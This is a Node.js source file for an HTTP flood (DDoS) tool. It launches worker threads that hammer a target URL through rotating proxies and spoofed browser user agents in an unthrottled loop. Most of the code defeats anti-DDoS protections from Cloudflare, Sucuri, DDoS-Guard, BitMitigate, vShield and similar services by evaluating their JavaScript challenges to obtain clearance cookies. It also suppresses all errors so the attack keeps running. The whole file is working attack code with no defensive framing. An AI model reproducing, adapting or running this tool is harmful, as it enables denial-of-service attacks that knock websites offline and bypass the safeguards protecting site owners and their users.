process.setMaxListeners(0);
const {
  Worker, isMainThread, parentPort, workerData
} = require('worker_threads');

if (isMainThread) {
        console.log("HTTP %s launched on %s for %s seconds", process.argv[2], process.argv[3], process.argv[5]);  //update 24.12.2018
        for (pas = 0; pas < 4; pas++) {
        var shit = new Worker(__filename, {
        workerData: process.argv
        });
        }
        setTimeout(function() {
            process.exit(1);
        }, process.argv[5] * 1000);

        } else {

var SandBoxr = require("sandboxr")
var acorn = require("acorn")
var reqengine = require('request');
var jar = reqengine.jar();
var fs = require('fs');
var proxies = fs.readFileSync(workerData[6], 'utf-8').replace(/\r/g, '').split('\n');
var proxiescookies = {};
var proxiesua = {};
const crypto = require('crypto');
    var PCookies = {};
for(var i= 0; i < proxies.length; i++)
{
    proxiescookies[i] = "";
    proxiesua[i] = "";
    PCookies[i] = [];
}
var urlparser = require('url');

// Setup Var

var request = reqengine.defaults({jar: jar});
var UserAgents = [
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "TheSuBot/0.2 (www.thesubot.de)",
        "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "zspider/0.9-dev http://feedback.redkolibri.com/",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
        "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
        "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
        "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
];
var cookieregex = /.*?;/;
var permanentprotection = "";

function defaultSettings(method,url,data,profile,proxyid,customcookie,cachecontrol,referer,useragent){
    var start = new Date()
        options = {};
        options.headers = {};
        options.method = method;
        options.timeout = 5000;
        options.proxy = "http://" + proxies[proxyid];

        if(useragent != ""){
            options.headers['user-agent'] = useragent;
        }else{
            if (proxiesua[proxyid] != "") {
                options.headers['user-agent'] = proxiesua[proxyid];
            } else {
                options.headers['user-agent'] = UserAgents[Math.floor(Math.random() * UserAgents.length)];
            }
        }

        options.headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
        options.headers['accept-encoding'] = 'gzip, deflate, br'; //'gzip, deflate, br';
        options.headers['accept-language'] = 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6';

        if(cachecontrol != ""){
            options.headers['cache-control'] = cachecontrol;
        }else{
            options.headers['cache-control'] = 'max-age=0';
        }
    if(referer != ""){
        options.headers['referer'] = referer.replace(/%RAND%/gi, Math.random());
    }

    options.headers['pragma'] = 'no-cache';

    var proxyV2 = "";
    for (var key in PCookies[proxyid]) {
        if (PCookies[proxyid].hasOwnProperty(key)) {
            proxyV2 = proxyV2 + key + "=" + PCookies[proxyid][key] + ";";
        }
    }
    options.headers['cookie'] = proxyV2 + customcookie + proxiescookies[proxyid];
    options.headers['upgrade-insecure-requests'] = '1';
        if(data != ""){
        options.headers['content-type'] = 'application/x-www-form-urlencoded';
        }
        options.url = url.replace(/%RAND%/gi, Math.random());
        options.body = data.replace(/%RAND%/gi, Math.random());
        options.insecure = true;
    //var end = new Date() - start
    //console.info('Execution time of Header Setup: %dms', end)
        return options;
}

function PlainCookie(proxyid,customcookie){
    var proxyV2 = "";
    for (var key in PCookies[proxyid]) {
        if (PCookies[proxyid].hasOwnProperty(key)) {
            proxyV2 = proxyV2 + key + "=" + PCookies[proxyid][key] + ";";
        }
    }
    var lol = proxyV2 + customcookie;
    return lol;
}

    function AESDecrypt(text) {
        let iv = Buffer.from(text.iv, 'hex');
        let encryptedText = Buffer.from(text.encryptedData, 'hex');
        let decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key), iv);
        let decrypted = decipher.update(encryptedText);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString();
    }
function sendrequest(options,proxyid,customcookie){
    if(permanentprotection.indexOf("blazingvps") !== -1){
      options.headers['user-agent'] = 'curl/7.16.3';
    }
    if(permanentprotection.indexOf("bitmitigate") !== -1){
      options.headers['cookie'] = "challenge=BitMitigate.com;" + options.headers['cookie'];
    }
        if(permanentprotection.indexOf("ddosguard") !== -1){
          options.headers['cookie'] = "__ddg_=15612;__ddgu=1234567891;" + options.headers['cookie'];
        }
        request(options, function (error, response, body) {

                if (typeof body !== 'undefined') {
                body = body.toString();
                setcookie = response.caseless.get('Set-Cookie');
                var finalcookie = '';
                if (typeof setcookie !== 'undefined') {
                setcookie.forEach(function(cookie){
                        regexthis = cookieregex.exec(cookie);
                        finalcookie = finalcookie + regexthis;
                });
                }


                if (body.indexOf('s += "==".slice(') !== -1) {
                        setTimeout(function() {
                                var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
                                        host = urlparser.parse(options.url).hostname,
                                        jsChlVc,
                                        weirdo,
                                        answerResponse,
                                        answerUrl;
                                jsChlVc = challenge[1];
                                challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);
                                challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];
                                weirdo = body.match(/id="cf-dn-(?:.*?)">(.*?)</);
                                challenge = challenge[1];
                                challenge = challenge.replace(/a\.value = /i, '');
                                challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
                                challenge = challenge.replace(/'; \d+'/g, '');
                                challenge = challenge.replace(/function\(p\){re(?:.*?)"\)}/g, '"' + host + '".charCodeAt');
                                                                challenge = challenge.replace(/s \+=(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)\n(?:.*)/mg, "");
                                challenge = challenge.replace(/eval\(eval\(e(?:.*?);/mg, eval(weirdo[1]));
                                stoken = body.match(/name="s" value="(.+?)"><\/input>/i);

                                                                //challenge = challenge.replace(/"(?:.*?)"\.charCodeAt\(\+\(\(((?:.*?)])\)(?:.*?)\);/gm, '"' + host + "\".charCodeAt($1);"); // TESTING

                                try {
                                                                               var ast = acorn.parse(challenge);
                                                                               var sandbox = SandBoxr.create(ast);
                                                                               var result = sandbox.execute();
                                                                               var nativeValue = result.toNative();
                                        jschlanswer = nativeValue;
                                //console.log(jschlanswer);
                                } catch (err) {
                                        return callback({
                                                errorType: 3,
                                                error: 'Error occurred during evaluation: ' + err.message
                                        }, body, response);

                                }
                                answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl?s=' + encodeURIComponent(stoken[1]) + '&jschl_vc=' + jsChlVc + '&pass=' + encodeURIComponent(challenge_pass) + '&jschl_answer=' + jschlanswer;

                                options.headers['referer'] = options.url;
                                options.url = answerUrl;
                                options.headers['cache-control'] = '';
                                options.followRedirect = false;
                                var oldmethod = options.method;
                                options.method = "GET";
                                    request(options, function(error, response, body) {
                                                if (response.statusCode === 302) {
                                                        options.followRedirect = true;
                                                        setcookie = response.caseless.get('Set-Cookie');
                                                        var dsqd = '';
                                                        setcookie.forEach(function(cookie){
                                                                regexthis = cookieregex.exec(cookie);
                                                                dsqd = dsqd + regexthis[0];
                                                                var cook = regexthis[0].split('=');
                                                                PCookies[proxyid][cook[0]] = cook[1].slice(0, -1);
                                                        });
                                                        options.headers['cookie'] = dsqd + ";shit=lol;";
                                                        options.url = response.headers.location;
                                                        options.method = oldmethod;
                                                        proxiesua[proxyid] = options.headers['user-agent'];
                                                        return sendrequest(options);
                                                } else {
                                                 // Error ?
                                                }
                                        });


                        }, 4000);
                }else if (body.indexOf('createCookie("__HFUID"') !== -1) {

                }else if (body.indexOf('You are being redirected...') !== -1 || body.indexOf('sucuri_cloudproxy_js') !== -1) {
            // GROS SHLAG DE SUCURI
                        var regex = /<script>(.*)e\(r\);<\/script><\/html>/;
                        chall = regex.exec(body);
                        eval(chall[1]);
                        r = r.replace('document.cookie','var moncookie');
                        r = r.replace('location.reload();','');
                        eval(r);
                        proxiescookies[proxyid] = proxiescookies[proxyid] + finalcookie + moncookie.replace('max-age=86400','');
                        proxiesua[proxyid] = options.headers['user-agent'];
                        options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + moncookie.replace('max-age=86400','');
                        return sendrequest(options);
                }else if (body.indexOf('nooder_challenge') !== -1){
            // GROS SHLAG DE NOODER
                        var regex = /type="text\/javascript">(.*)setTimeout/;
                        chall = regex.exec(body);
                        chall = chall[1].replace('document.cookie', 'var moncookie');
                        chall = chall.replace('window.onload = function(){','');
                        chall = chall + "moncookie;";
                        var ast = acorn.parse(chall);
                        var sandbox = SandBoxr.create(ast);
                        var result = sandbox.execute();
                        var nativeValue = result.toNative();
                        theultimatecookie = cookieregex.exec(nativeValue);
                        proxiescookies[proxyid] = proxiescookies[proxyid] + finalcookie + theultimatecookie;
                        options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + theultimatecookie;
                        proxiesua[proxyid] = options.headers['user-agent'];
                        options.headers['user-agent'] = options.headers['user-agent'];
                        return sendrequest(options);
                }else if (body.indexOf('var as = document.createElement(\'script\'); as.type = \'text/javascript\'; as.async = true; as.src') !== -1){
            // GROS SHLAG DE VSHIELD
                var regex = /as\.async = true; as\.src = '\/(.*?)';/;
                chall = regex.exec(body);
                host = urlparser.parse(options.url).hostname;
                jsurl = response.request.uri.protocol + '//' + host + '/' + chall[1];
                var oldmethod = options.method;
                var oldurl = options.url;
                options.url = jsurl;
                var oldmethod = options.method;
                options.method = "GET";
                request(options, function(error, response, body) {
                        regx = /cookie = '(.*?)=(.*?)'/;
                        cookies = regx.exec(body);
                        options.method = oldmethod;
                        options.headers['cookie'] = finalcookie + cookies[1] + "=" + cookies[2] + ";";
                        proxiescookies[proxyid] = proxiescookies[proxyid] + finalcookie + cookies[1] + "=" + cookies[2] + ";";
                        proxiesua[proxyid] = options.headers['user-agent'];
                        options.url = oldurl;
                        return sendrequest(options);
                });

                }else if (body.indexOf('/___S___/?rid=') !== -1){
            // GROS SHLAG DE BLAZING
                        var regex = /xhr\.open\("GET","\/___S___\/\?rid=(.*?)",true\),xhr/;
                        chall = regex.exec(body);
                        chall = chall[1].replace('" + ww +"', '1080');
                        var host = urlparser.parse(options.url).hostname;
                        var newurl = response.request.uri.protocol + '//' + host + "/___S___/?rid=" + chall;
                        var oldurl =  options.url;
                        options.url = newurl;
                        request(options, function (error, response, body) {
                                                body = body.toString('utf8');
                                                if (body.indexOf('toNumbers') !== -1) {
                                                        body = body.replace('redir();','');
                                                        body = body.replace('document.cookie=','(');
                                                        body = body.replace(/domain(?:.*?)";/,'");');
                                                        body = body.replace('$(window).width()','5');
                                                        console.log("exec blaz")
                                                        var ast = acorn.parse(body);
                                                        var sandbox = SandBoxr.create(ast);
                                                        var result = sandbox.execute();
                                                        var nativeValue = result.toNative();
                                                        console.log(body,nativeValue);
                                                        options.headers['cookie'] = finalcookie + moncookie;
                                                        options.url = oldurl;
                                                        return sendrequest(options);
                                                }

                                                });
                }else if (body.indexOf('blazing_answer') !== -1){
                        permanentprotection = permanentprotection + "blazingvps";
        }else if (body.indexOf('challenge=BitMitigate.com') !== -1){
                        permanentprotection = permanentprotection + "bitmitigate";
                }else if (body.indexOf('ddgu.ddos-guard.net') !== -1){
                        permanentprotection = permanentprotection + "ddosguard";
                }else if (body.indexOf('onload="challenge();"') !== -1){
                        var regex = /(eval\((?:.*?)}\)\))/;
                        chall = regex.exec(body);
                        js = chall[1].replace('eval', 'shit = ');
                        eval(js);
                        var regex2 = /challenge\(\)(?:.*?){(?:.*?)=(?:.*?)'(.*?)=(.*?);/;
                        chall2 = regex2.exec(shit);
                        chall2[1] = chall2[1].replace(/ /g, '');
                        proxiescookies[proxyid] = proxiescookies[proxyid] + finalcookie + chall2[1] + "=" + chall2[2];
                        options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + chall2[1] + "=" + chall2[2];
                        proxiesua[proxyid] = options.headers['user-agent'];
                        return sendrequest(options);
                }else if (body.indexOf('document.cookie="vDDoS') !== -1){
                        var token = body.match(/vDDoS=(.*?)(?: |;)/)[1];
                        proxiescookies[proxyid] = proxiescookies[proxyid] + finalcookie + "vDDoS=" + token + ";";
                        options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + "vDDoS=" + token + ";";
                        proxiesua[proxyid] = options.headers['user-agent'];
                        return sendrequest(options);
                }else if (body.indexOf('netrix_form') !== -1){
                        if (proxiescookies[proxyid].indexOf('nhuid') !== -1){
                                 proxiescookies[proxyid] = "";
                        }else{
            var nhuid = body.match(/__nhuid', '(.*)'/)[1];
                        var jslo = body.match(/value="(.*)"/)[1];
                        var host = urlparser.parse(options.url).hostname;
                        var newurl = response.request.uri.protocol + '//' + host + "/ntrx/l/jslo?js_lo=" + jslo + "&js_answer=";
                        var oldurl =  options.url;
                        options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + "__nhuid=" + nhuid + ";";
                        options.url = newurl;
                        options.headers['referer'] = response.request.uri.protocol + '//' + host + "/";
                        options.followRedirect = false;
                        request(options, function (error, response, body) {
                                                proxiesua[proxyid] = options.headers['user-agent'];
                                                setcookie = response.caseless.get('Set-Cookie');
                                                var newcookie = '';
                                                if (typeof setcookie !== 'undefined') {
                                                setcookie.forEach(function(cookie){
                                                        regexthis = cookieregex.exec(cookie);
                                                        newcookie = newcookie + regexthis;
                                                });
                                                }
                                                options.headers['cookie'] = proxiescookies[proxyid] + finalcookie + "__nhuid=" + nhuid + ";" + newcookie;
                                                options.url = oldurl;
                                                return sendrequest(options);
                        });
                        }
                }

                }

        });
}
// Proxy Error handling
process.on('uncaughtException', function(err) {});
process.on('unhandledRejection', function(err) {});
// Timer & Attack Loop
setInterval(function() {
        proxyid = Math.floor(Math.random() * proxies.length);
        sendrequest(defaultSettings(workerData[2], workerData[3], workerData[4], "",proxyid,workerData[8],workerData[9],workerData[10],workerData[11]),proxyid,workerData[8]);
});
}



